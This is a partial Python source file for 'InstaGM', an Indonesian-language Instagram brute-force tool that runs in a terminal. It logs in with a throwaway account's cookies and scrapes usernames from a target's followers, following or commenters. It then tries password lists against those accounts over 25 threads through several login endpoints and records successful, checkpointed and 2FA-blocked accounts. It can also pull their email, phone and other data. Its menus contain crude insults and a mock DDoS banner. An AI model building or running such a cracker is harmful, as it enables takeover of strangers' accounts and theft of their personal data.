...
class Brute:
    ...
    def Login(self):
        ...
        Console().print(f'\n {P2}[{H2}*{P2}] CookiesLog : masukan cookies instagram anda\n {P2}[{H2}*{P2}] type : anda wajib menggunakan akun tumbal untuk login')
        cokie = Console().input(f' {P2}[{H2}?{P2}] cookies instagram : ')
    ...
    def Logos(self):
        Console().print(f''' DDOS IP LU SEKARANG {self.ipp}
...
$$/      $$/ $$$$$$$$/ $$/      $$/ $$$$$$$$/ $$/   $$/ ''')
    ...
    def Menu(self):
        ...
        Console().print(f' {M2}[{H2}1{M2}]{K2}. ᴅᴜᴍᴘ ᴅᴀʀɪ ꜰᴏʟʟᴏᴡᴇʀꜱ    {M2}[{H2}4{M2}]{K2}. ᴅᴜᴍᴘ ᴅᴀʀɪ ᴜꜱᴇʀɴᴀᴍᴇ')
        Console().print(f' {M2}[{H2}2{M2}]{K2}. ᴅᴜᴍᴘ ᴅᴀʀɪ ꜰᴏʟʟᴏᴡɪɴɢ    {M2}[{H2}5{M2}]{K2}. ᴄʜᴇᴄᴋᴘᴏɪɴᴛ')
        Console().print(f' {M2}[{H2}3{M2}]{K2}. ᴅᴜᴍᴘ ᴅᴀʀɪ ᴋᴏᴍᴇɴᴛᴀʀ     {M2}[{H2}6{M2}]{K2}. ᴄᴇᴋ ʜᴀꜱɪʟ\n')
        Console().print(f'   {P2}ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇᴛɪ {H2}"𝖊𝖝𝖎𝖙"{P2} ᴜɴᴛᴜᴋ ʟᴏɢᴏᴜᴛ ᴅᴀʀɪ ᴛᴏᴏʟꜱ\nᴊɪᴋᴀ ɪɴɢɪɴ ᴋᴇ ᴍᴇɴᴜ ʟᴀɪɴ ᴋᴇᴛɪᴋ {B2}"𝖑𝖆𝖎𝖓"{P2} di keyboard anda\n')
        self.input_menu(cokie)

    def input_menu(self, kueh):
        x = Console().input(f' {M2}[{H2}?{M2}]{K2} ɪɴᴘᴜᴛ ᴍᴇɴᴜ : ')
        if x == '1' or x == '01' or x == '2' or x == '02':
             Console().print(f'\n {M2}[{H2}+{M2}]{B2} ᴛᴀʀɢᴇᴛ ɢᴜɴᴀᴋᴀɴ{H2}","{B2}ᴜɴᴛᴜᴋ ᴘᴇᴍɪꜱᴀʜ ᴜꜱᴇʀɴᴀᴍᴇ\n {M2}[{H2}!{M2}]{B2}ᴜꜱᴇʀɴᴀᴍᴇ nya harus publik ya kontol')
             uname = Console().input(f' {M2}[{H2}?{M2}]{K2} ɪɴᴘᴜᴛ ᴛᴀʀɢᴇᴛ : ')
             ...
             else:Console().print(f' {P2}[{H2}+{P2}] Username/target yang lu masukin dah di ewe') ; time.sleep(3.1) ; self.Menu()
             ...
             Console().print(f'\n {P2}[{H2}+{P2}] Files akun checkpoint anda terdapat {K2}{len(self.id)}\n {P2}[{H2}+{P2}] Crack ulang hasil checkpoint tergantung owner akun ya')
             self.methode()
            ...
            Console().print(f' {P2}[{H2}+{P2}] InstaGM : BruteForce{B2} Instagram {P2}BY {H2}Jhon Chen Xu\n {P2}[{H2}+{P2}] Copyright {H2}© {P2}2024 {B2}Jhon Chen Xu{P2} | All Rights Reserved')
    ...
    def methode(self):
        Console().print(f'\n\n {P2}[{H2}✓{P2}] Berhasil mengumpulkan {H2}{len(self.id)}{P2} username\n {P2}[{H2}+{P2}] Silahkan pilih metode login anda dibawah\n {P2}[{H2}+{P2}] recommended menggunakan metode {H2}API {P2}& {H2}Threads\n')
        Console().print(f' {P2}[{H2}1{P2}]. Metode log Api kontol        {P2}[{H2}4{P2}]. Metode log Api_V1')
        Console().print(f' {P2}[{H2}2{P2}]. Metode log Ajax       {P2}[{H2}5{P2}]. Metode log Api_V2')
        Console().print(f' {P2}[{H2}3{P2}]. Metode log Threads    {P2}[{H2}6{P2}]. Metode log Ajax_in')
        xyz = Console().input(f'\n {P2}[{H2}?{P2}] Input metode : ')
        Console().print(f'\n {P2}[{H2}+{P2}] Apakah anda ingin menampilkan semua data pada akun OK?\n {P2}[{H2}+{P2}] cnth : {B2}email, nomor, bio, userid, private, verifikasi\n {P2}[{H2}+{P2}] Menampilkan semua data pada akun {H2}OK{P2} kemungkinan proses crack lambat')
        yxz = Console().input(f'\n {P2}[{H2}?{P2}] Input menu y/t : ')
    ...
    def exec_malink(self, methode_login, xontolmek):
        ...
        with executor(max_workers=25) as bol:
           for kontol in self.id:
               ...
               elif methode_login in ('2','02'):bol.submit(self.ExecAjax, username, password,showdate)
               elif methode_login in ('3','03'):bol.submit(self.ExecThreads, username, password,showdate)
    ...
    def ExecLogin(self, user, passwd, allData_akun = None, file = 'data/termux/internal/'):
        ...
        kont = random.randint
        uaig = requ.UserAgent()
        Console().print(f' {P2}[{H2}+{P2}] PEPEK IJO : {H2}BruteForce{P2} ({H2}{self.lp}{P2}/{H2}{len(self.id)}{P2}) OK-:{H2}{self.ok}{P2}/CP-:{K2}{self.cp}{P2}/{P2}A2F-:{M2}{self.tw} ',end='\r') ; sys.stdout.flush()
        while True:
            try:
    ...
    def ExecAjax(self, user, password, allData_akun=None, file='data/termux/internal/'):
        ...
        Console().print(f' {P2}[{H2}+{P2}] InstaGM : {H2}BruteForce{P2} ({H2}{self.lp}{P2}/{H2}{len(self.id)}{P2}) OK-:{H2}{self.ok}{P2}/CP-:{K2}{self.cp}{P2}/{P2}A2F-:{M2}{self.tw} ',end='\r') ; sys.stdout.flush()
        while True:
            try:
                headers = {
    ...
    def api_vjs2(self, user, password, allData_akun=None, file='data/termux/internal/'):
        ...
        for pswd in password:
            try:
                 ...
                 data = json.dumps({
                   'phone_id': requ.poid(),
                   '_csrftoken': resp.cookies.get('csrftoken','TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E'),
                   'username': user,
                   'guid': requ.guid(),
                   'device_id': requ.DeviceId(),
                   'password': pswd,
